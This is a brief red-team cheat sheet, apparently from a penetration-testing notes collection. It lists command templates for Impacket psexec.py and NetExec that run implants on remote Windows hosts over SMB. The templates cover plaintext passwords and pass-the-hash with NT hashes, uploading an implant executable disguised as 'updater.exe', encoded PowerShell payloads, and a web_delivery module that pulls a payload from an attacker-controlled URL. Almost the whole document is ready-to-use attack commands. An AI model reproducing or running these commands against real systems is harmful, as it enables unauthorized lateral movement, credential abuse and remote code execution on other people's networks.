# Manual

## 01 - Impacket

Execute `.bat` files.

```
$ psexec.py [<domain>/]<username>:<password>@<IP> -c implant.bat

$ psexec.py [<domain>/]<username>@<IP> -hashes :<nt_hash> -c implant.bat
```

Execute custom `.exe` service files.

```
$ psexec.py [<domain>/]<username>:<password>@<IP> -file implant.exe -c implant.exe -service-name <ServiceSVC> -remote-binary-name updater.exe

$ psexec.py [<domain>/]<username>@<IP> -hashes :<nt_hash> -file implant.exe -c implant.exe -service-name <ServiceSVC> -remote-binary-name updater.exe
```

## 02 - NetExec

Authenticate via username and password

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -x implant.bat

$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -x "powershell -E <base64_payload>"
```

Authenticate via Pass The Hash

```
$ netexec smb <IP> -u "<username>" -H <nt_hash> [-d <domain> | --local-auth] -x implant.bat

$ netexec smb <IP> -u "<username>" -H <nt_hash> [-d <domain> | --local-auth] -x "powershell -E <base64_payload>"
```

Refer to [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Linux/C2 Frameworks|Metasploit Web Delivery]] module.

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -M web_delivery -o URL=http://<attacker_IP>/[path/to/URI]

$ netexec smb <IP> -u "<username>" -H <nt_hash> [-d <domain> | --local-auth] -M web_delivery -o URL=http://<attacker_IP>/[path/to/URI]
```

---
## References

- [Hacking Articles: Windows Exploitation Regsvr32](https://www.hackingarticles.in/windows-exploitation-regsvr32/)

- [Cross Platform Dropper](https://khast3x.club/posts/2020-06-27-Cross-Platform-Dropper/)